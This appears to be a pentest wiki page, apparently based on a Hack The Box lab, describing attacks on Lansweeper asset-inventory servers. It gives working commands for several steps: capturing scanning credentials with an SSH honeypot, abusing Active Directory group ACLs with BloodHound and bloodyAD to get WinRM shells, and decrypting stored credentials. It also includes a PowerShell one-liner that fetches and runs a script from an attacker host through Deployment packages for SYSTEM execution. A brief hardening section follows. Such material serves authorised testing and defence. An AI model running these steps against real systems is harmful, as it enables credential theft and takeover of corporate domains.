  \nLansweeper is an IT asset discovery and inventory platform commonly deployed on Windows and integrated with Active Directory.\
  \ Credentials configured in Lansweeper are used by its scanning engines to authenticate to assets over protocols like SSH,\
  \ SMB/WMI and WinRM. Misconfigurations frequently allow:\n\n- Credential interception by redirecting a scanning target to\
  \ an attacker-controlled host (honeypot)\n- Abuse of AD ACLs exposed by Lansweeper-related groups to gain remote access\n\
  - On-host decryption of Lansweeper-configured secrets (connection strings and stored scanning credentials)\n- Code execution\
  \ on managed endpoints via the Deployment feature (often running as SYSTEM)\n\nThis page summarizes practical attacker workflows\
  \ and commands to abuse these behaviors during engagements.\n\n## 1) Harvest scanning credentials via honeypot (SSH example)\n\
  \nIdea: create a Scanning Target that points to your host and map existing Scanning Credentials to it. When the scan runs,\
  \ Lansweeper will attempt to authenticate with those credentials, and your honeypot will capture them.\n\nSteps overview\
  \ (web UI):\n- Scanning → Scanning Targets → Add Scanning Target\n  - Type: IP Range (or Single IP) = your VPN IP\n  - Configure\
  \ SSH port to something reachable (e.g., 2022 if 22 is blocked)\n  - Disable schedule and plan to trigger manually\n- Scanning\
  \ → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)\n- Click “Scan\
  \ now” on the target\n- Run an SSH honeypot and retrieve the attempted username/password\n\nExample with sshesame:\n\n```yaml\n\
  # sshesame.conf\nserver:\n  listen_address: 10.10.14.79:2022\n```\n\n```bash\n# Install and run\nsudo apt install -y sshesame\n\
  sshesame --config sshesame.conf\n# Expect client banner similar to RebexSSH and cleartext creds\n# authentication for user\
  \ \"svc_inventory_lnx\" with password \"<password>\" accepted\n# connection with client version \"SSH-2.0-RebexSSH_5.0.x\"\
  \ established\n```\n\nValidate captured creds against DC services:\n\n```bash\n# SMB/LDAP/WinRM checks (NetExec)\nnetexec\
  \ smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'\nnetexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p\
  \ '<password>'\nnetexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'\n```\n\nNotes\n- Works similarly for\
  \ other protocols when you can coerce the scanner to your listener (SMB/WinRM honeypots, etc.). SSH is often the simplest.\n\
  - Many scanners identify themselves with distinct client banners (e.g., RebexSSH) and will attempt benign commands (uname,\
  \ whoami, etc.).\n\n## 2) AD ACL abuse: gain remote access by adding yourself to an app-admin group\n\nUse BloodHound to\
  \ enumerate effective rights from the compromised account. A common finding is a scanner- or app-specific group (e.g., “Lansweeper\
  \ Discovery”) holding GenericAll over a privileged group (e.g., “Lansweeper Admins”). If the privileged group is also member\
  \ of “Remote Management Users”, WinRM becomes available once we add ourselves.\n\nCollection examples:\n\n```bash\n# NetExec\
  \ collection with LDAP\nnetexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server\
  \ <DC_IP>\n\n# RustHound-CE collection (zip for BH CE import)\nrusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>'\
  \ -c All --zip\n```\n\nExploit GenericAll on group with BloodyAD (Linux):\n\n```bash\n# Add our user into the target group\n\
  bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \\\n  add groupMember \"Lansweeper Admins\"\
  \ svc_inventory_lnx\n\n# Confirm WinRM access if the group grants it\nnetexec winrm inventory.sweep.vl -u svc_inventory_lnx\
  \ -p '<password>'\n```\n\nThen get an interactive shell:\n\n```bash\nevil-winrm -i inventory.sweep.vl -u svc_inventory_lnx\
  \ -p '<password>'\n```\n\nTip: Kerberos operations are time-sensitive. If you hit KRB_AP_ERR_SKEW, sync to the DC first:\n\
  \n```bash\nsudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>\n```\n\n## 3) Decrypt Lansweeper-configured secrets on the\
  \ host\n\nOn the Lansweeper server, the ASP.NET site typically stores an encrypted connection string and a symmetric key\
  \ used by the application. With appropriate local access, you can decrypt the DB connection string and then extract stored\
  \ scanning credentials.\n\nTypical locations:\n- Web config: `C:\\Program Files (x86)\\Lansweeper\\Website\\web.config`\n\
  \  - `<connectionStrings configProtectionProvider=\"DataProtectionConfigurationProvider\">` … `<EncryptedData>…`\n- Application\
  \ key: `C:\\Program Files (x86)\\Lansweeper\\Key\\Encryption.txt`\n\nUse SharpLansweeperDecrypt to automate decryption and\
  \ dumping of stored creds:\n\n```powershell\n# From a WinRM session or interactive shell on the Lansweeper host\n# PowerShell\
  \ variant\nUpload-File .\\LansweeperDecrypt.ps1 C:\\ProgramData\\LansweeperDecrypt.ps1   # depending on your shell\npowershell\
  \ -ExecutionPolicy Bypass -File C:\\ProgramData\\LansweeperDecrypt.ps1\n# Tool will:\n#  - Decrypt connectionStrings from\
  \ web.config\n#  - Connect to Lansweeper DB\n#  - Decrypt stored scanning credentials and print them in cleartext\n```\n\
  \nExpected output includes DB connection details and plaintext scanning credentials such as Windows and Linux accounts used\
  \ across the estate. These often have elevated local rights on domain hosts:\n\n```text\nInventory Windows  SWEEP\\svc_inventory_win\
  \  <StrongPassword!>\nInventory Linux    svc_inventory_lnx        <StrongPassword!>\n```\n\nUse recovered Windows scanning\
  \ creds for privileged access:\n\n```bash\nnetexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'\n\
  # Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers\n```\n\n## 4) Lansweeper Deployment\
  \ → SYSTEM RCE\n\nAs a member of “Lansweeper Admins”, the web UI exposes Deployment and Configuration. Under Deployment\
  \ → Deployment packages, you can create packages that run arbitrary commands on targeted assets. Execution is performed\
  \ by the Lansweeper service with high privilege, yielding code execution as NT AUTHORITY\\SYSTEM on the selected host.\n\
  \nHigh-level steps:\n- Create a new Deployment package that runs a PowerShell or cmd one-liner (reverse shell, add-user,\
  \ etc.).\n- Target the desired asset (e.g., the DC/host where Lansweeper runs) and click Deploy/Run now.\n- Catch your shell\
  \ as SYSTEM.\n\nExample payloads (PowerShell):\n\n```powershell\n# Simple test\npowershell -nop -w hidden -c \"whoami >\
  \ C:\\Windows\\Temp\\ls_whoami.txt\"\n\n# Reverse shell example (adapt to your listener)\npowershell -nop -w hidden -c \"\
  IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')\"\n```\n\nOPSEC\n- Deployment actions are noisy\
  \ and leave logs in Lansweeper and Windows event logs. Use judiciously.\n\n## Detection and hardening\n\n- Restrict or remove\
  \ anonymous SMB enumerations. Monitor for RID cycling and anomalous access to Lansweeper shares.\n- Egress controls: block\
  \ or tightly restrict outbound SSH/SMB/WinRM from scanner hosts. Alert on non-standard ports (e.g., 2022) and unusual client\
  \ banners like Rebex.\n- Protect `Website\\\\web.config` and `Key\\\\Encryption.txt`. Externalize secrets into a vault and\
  \ rotate on exposure. Consider service accounts with minimal privileges and gMSA where viable.\n- AD monitoring: alert on\
  \ changes to Lansweeper-related groups (e.g., “Lansweeper Admins”, “Remote Management Users”) and on ACL changes granting\
  \ GenericAll/Write membership on privileged groups.\n- Audit Deployment package creations/changes/executions; alert on packages\
  \ spawning cmd.exe/powershell.exe or unexpected outbound connections.\n\n## Related topics\n- SMB/LSA/SAMR enumeration and\
  \ RID cycling\n- Kerberos password spraying and clock skew considerations\n- BloodHound path analysis of application-admin\
  \ groups\n- WinRM usage and lateral movement\n\n## References\n- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and\
